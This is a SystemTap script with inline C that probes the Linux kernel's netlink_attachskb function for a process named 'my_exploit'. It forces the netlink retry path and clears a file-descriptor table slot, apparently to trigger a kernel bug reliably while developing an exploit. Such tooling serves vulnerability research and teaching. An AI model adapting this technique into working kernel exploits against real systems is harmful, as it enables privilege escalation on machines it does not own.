%{
    #include <net/sock.h>
    #include <linux/fdtable.h>
%}

function force_trigger_before:long (arg_sock:long)
%{
    struct netlink_ring 
    {
        void                    **pg_vec;
        unsigned int            head;
        unsigned int            frames_per_block;
        unsigned int            frame_size;
        unsigned int            frame_max;

        unsigned int            pg_vec_order;
        unsigned int            pg_vec_pages;
        unsigned int            pg_vec_len;

        atomic_t                pending;
    };

    struct netlink_sock 
    {
        /* struct sock has to be the first member of netlink_sock */
        struct sock             sk;
        u32                     portid;
        u32                     dst_portid;
        u32                     dst_group;
        u32                     flags;
        u32                     subscriptions;
        u32                     ngroups;
        unsigned long           *groups;
        unsigned long           state;
        size_t                  max_recvmsg_len;
        wait_queue_head_t       wait;
        bool                    cb_running;
        struct netlink_callback cb;
        struct mutex            *cb_mutex;
        struct mutex            cb_def_mutex;
        void                    (*netlink_rcv)(struct sk_buff *skb);
        int                     (*netlink_bind)(int group);
        void                    (*netlink_unbind)(int group);
        struct module           *module;

        #ifdef CONFIG_NETLINK_MMAP
        struct mutex            pg_vec_lock;
        struct netlink_ring     rx_ring;
        struct netlink_ring     tx_ring;
        atomic_t                mapped;
        #endif /* CONFIG_NETLINK_MMAP */
    };

    struct sock *sk = (void*) STAP_ARG_arg_sock;
    struct netlink_sock *nlk = (void*) sk;

    _stp_printf("- sk->sk_rmem_alloc = %d\n", sk->sk_rmem_alloc);
    _stp_printf("- sk->sk_rcvbuf = %d\n", sk->sk_rcvbuf);
    nlk->state |= 1;   // enter the netlink_attachskb() retry path    
%}

function force_trigger_after:long (arg_sock:long)
%{
    struct files_struct *files = current->files;
    struct fdtable *fdt = files_fdtable(files);
    fdt->fd[3] = NULL; 
%}


probe kernel.function ("netlink_attachskb")
{
    if (execname() == "my_exploit")
    {
        force_trigger_before($sk);
    }
}


probe kernel.function ("netlink_attachskb").return
{
    if (execname() == "my_exploit")
    {
        printf("(%d-%d) [netlink] <== netlink_attachskb = %x\n", pid(), tid(), $return)
    }
}
